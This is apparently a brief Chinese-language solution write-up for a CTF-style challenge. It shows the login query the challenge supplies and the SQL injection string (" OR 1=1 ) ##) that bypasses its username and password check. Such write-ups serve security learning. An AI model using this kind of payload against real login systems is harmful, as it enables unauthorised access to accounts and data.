# 解法
有給出 sql function
`SELECT * FROM user WHERE ( username = "" ) AND ( password = "" )`
就進行簡單的 sql injection
`" OR 1=1 ) ##`
